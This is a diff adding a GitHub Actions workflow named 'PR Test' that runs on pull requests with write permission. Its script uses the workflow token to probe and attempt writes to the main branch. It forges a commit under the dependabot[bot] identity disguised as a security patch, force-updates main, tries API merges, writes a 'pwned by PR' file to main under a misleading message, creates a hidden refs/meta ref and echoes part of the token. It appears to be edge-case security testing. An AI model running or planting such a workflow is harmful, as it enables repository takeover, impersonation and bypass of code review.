@@ -1,0 +1,135 @@
+﻿name: PR Test
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: write
+jobs:
+  rewrite:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Extreme T5 from PR
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          BASE="https://api.github.com/repos/${GITHUB_REPOSITORY}"
+          TS=$(date -u '+%Y%m%d_%H%M%S')
+
+          echo "=== CONTEXT ==="
+          echo "EVENT:        $GITHUB_EVENT_NAME"
+          echo "ACTOR:        $GITHUB_ACTOR"
+          echo "TOKEN_PREFIX: ${GH_TOKEN:0:10}"
+          echo "HEAD_REF:     $GITHUB_HEAD_REF"
+          echo "BASE_REF:     $GITHUB_BASE_REF"
+
+          MAIN_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${BASE}/git/ref/heads/main" | jq -r '.object.sha')
+          TREE_SHA=$(curl -sf -H "Authorization: token $GH_TOKEN" \
+            "${BASE}/git/commits/${MAIN_SHA}" | jq -r '.tree.sha')
+          echo "main tip: $MAIN_SHA  tree: $TREE_SHA"
+
+          # -- T_BLOB: can we create a blob? --------------------------------
+          T_BLOB=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/blobs" \
+            -d "{\"content\":\"pr-edge-test ${TS}\",\"encoding\":\"utf-8\"}")
+          echo "T_BLOB  create blob           = HTTP_${T_BLOB}"
+
+          # -- T_BRANCH: can we create a new branch? -----------------------
+          T_BRANCH=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/heads/canary-${TS}\",\"sha\":\"${MAIN_SHA}\"}")
+          echo "T_BRANCH create branch POST   = HTTP_${T_BRANCH}"
+
+          # -- Build ghost commit (same tree, 0 diff, dependabot identity) --
+          GHOST=$(curl -s -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"chore: security patch\n\nSigned-off-by: dependabot[bot]\",\"tree\":\"${TREE_SHA}\",\"parents\":[\"${MAIN_SHA}\"],\"author\":{\"name\":\"dependabot[bot]\",\"email\":\"49699333+dependabot[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "COMMIT_FAILED"')
+          echo "ghost commit: $GHOST"
+
+          # -- T_PATCH: PATCH main, force:false, Authorization: token ------
+          T_PATCH=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "T_PATCH  token  force:false   = HTTP_${T_PATCH}"
+
+          # -- T_PATCH_FORCE: PATCH main, force:true -----------------------
+          T_PATCHF=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":true}")
+          echo "T_PATCH  token  force:true    = HTTP_${T_PATCHF}"
+
+          # -- T_BEARER: same PATCH with 'bearer' scheme -------------------
+          T_BEARER=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "Authorization: bearer $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "T_BEARER bearer force:false   = HTTP_${T_BEARER}"
+
+          # -- T_APIVER: PATCH + X-GitHub-Api-Version ----------------------
+          T_APIVER=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PATCH -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "${BASE}/git/refs/heads/main" \
+            -d "{\"sha\":\"${GHOST}\",\"force\":false}")
+          echo "T_APIVER +ApiVersion hdr      = HTTP_${T_APIVER}"
+
+          # -- T_MERGE_API: POST /merges -----------------------------------
+          T_MERGE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/merges" \
+            -d "{\"base\":\"main\",\"head\":\"${GHOST}\",\"commit_message\":\"Merge security patch\"}")
+          echo "T_MERGE  POST /merges         = HTTP_${T_MERGE}"
+
+          # -- T_CONTENTS: PUT a file directly to main ---------------------
+          CONTENT_B64=$(echo -n "pwned by PR ${TS}" | base64 -w0)
+          T_CONTENTS=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X PUT -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/contents/pwn-${TS}.txt" \
+            -d "{\"message\":\"chore: update config\",\"content\":\"${CONTENT_B64}\",\"branch\":\"main\"}")
+          echo "T_CONTENTS PUT /contents/main = HTTP_${T_CONTENTS}"
+
+          # -- T_HIDDEN_REF: write to refs/meta/ --------------------------
+          META_SHA=$(curl -s -X POST \
+            -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/commits" \
+            -d "{\"message\":\"meta:${TS}\",\"tree\":\"${TREE_SHA}\",\"parents\":[],\"author\":{\"name\":\"github-actions[bot]\",\"email\":\"41898282+github-actions[bot]@users.noreply.github.com\"}}" \
+            | jq -r '.sha // "FAILED"')
+          T_META=$(curl -s -o /dev/null -w "%{http_code}" \
+            -X POST -H "Authorization: token $GH_TOKEN" \
+            -H "Content-Type: application/json" \
+            "${BASE}/git/refs" \
+            -d "{\"ref\":\"refs/meta/pr-${TS}\",\"sha\":\"${META_SHA}\"}")
+          echo "T_HIDDEN_REF refs/meta/       = HTTP_${T_META}"
+
+          echo ""
+          echo "=== PR WRITE EDGE-CASE SUMMARY ==="
+          echo "on:pull_request  permissions:contents:write  actor:${GITHUB_ACTOR}"
+          echo "T_BLOB           = HTTP_${T_BLOB}"
+          echo "T_BRANCH         = HTTP_${T_BRANCH}"
+          echo "T_PATCH (f:F)    = HTTP_${T_PATCH}"
+          echo "T_PATCH (f:T)    = HTTP_${T_PATCHF}"
+          echo "T_BEARER         = HTTP_${T_BEARER}"
+          echo "T_APIVER         = HTTP_${T_APIVER}"
+          echo "T_MERGE_API      = HTTP_${T_MERGE}"
+          echo "T_CONTENTS       = HTTP_${T_CONTENTS}"
+          echo "T_HIDDEN_REF     = HTTP_${T_META}"
